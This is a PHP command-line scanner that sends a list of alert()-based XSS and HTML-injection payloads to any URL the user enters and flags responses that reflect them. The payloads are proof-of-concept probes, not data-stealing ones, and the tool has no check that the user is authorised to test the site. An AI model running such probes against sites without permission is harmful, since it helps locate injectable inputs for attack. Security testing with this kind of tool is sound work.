<?php
// Prompt user to enter the target website URL
echo "Enter your target website URL: ";
$target_url = trim(fgets(STDIN));

// Define an array of payloads to test
$payloads = array(
    "<script>alert('HTML Injection Vulnerability')</script>",
    "<img src='x' onerror='alert(\"HTML Injection Vulnerability\")'>",
    "<svg/onload=alert('HTML Injection Vulnerability')>",
    "<a href=\"javascript:alert('HTML Injection Vulnerability')\">Click Me</a>",
    "<iframe src=\"javascript:alert('HTML Injection Vulnerability')\"></iframe>",
    "<body onload=alert('HTML Injection Vulnerability')>",
    "<div onmouseover=alert('HTML Injection Vulnerability')>Hover Over Me</div>",
    "<svg><script>alert('HTML Injection Vulnerability')</script></svg>",
    "<img src=\"x\" onmouseover=alert('HTML Injection Vulnerability')>",
    "<a href=# onclick=alert('HTML Injection Vulnerability')>Click Me</a>",
    "<div style=\"background-image:url(javascript:alert('HTML Injection Vulnerability'))\">",
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnSFRNTCBJbmplY3Rpb24gVmVyc2lvbjoxLjAnKTs8L3NjcmlwdD4=\">",
    "<marquee onstart=alert('HTML Injection Vulnerability')>Scroll Me</marquee>",
    "<form action=\"javascript:alert('HTML Injection Vulnerability')\"><input type=submit></form>",
    "<applet code=\"javascript:alert('HTML Injection Vulnerability')\"></applet>",
    "<div style=\"-moz-binding:url('https://example.com/xss.xml#xss')\">",
    "<input type=\"image\" src=\"x\" onerror=\"alert('HTML Injection Vulnerability')\">",
    // Add more payloads here as needed
);

// Define ANSI escape codes for colors
$red = "\033[31m"; // Red
$green = "\033[32m"; // Green
$reset = "\033[0m"; // Reset

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Iterate over payloads and test each one
foreach ($payloads as $payload) {
    // Construct the POST data with the payload
    $post_data = array(
        'input_field' => $payload
    );

    // Set the target URL and HTTP method
    curl_setopt($ch, CURLOPT_URL, $target_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));

    // Execute cURL request
    $response = curl_exec($ch);

    // Check for any errors
    if (curl_errno($ch)) {
        echo $red . 'Error: ' . curl_error($ch) . $reset . "\n";
        continue;
    }

    // Analyze the response for indications of successful injection
    if (strpos($response, "HTML Injection Vulnerability") !== false) {
        echo $green . "HTML Injection Vulnerability detected with payload: $payload" . $reset . "\n";
    } else {
        echo $red . "No HTML Injection Vulnerability detected with payload: $payload" . $reset . "\n";
    }
}

// Close cURL session
curl_close($ch);
?>
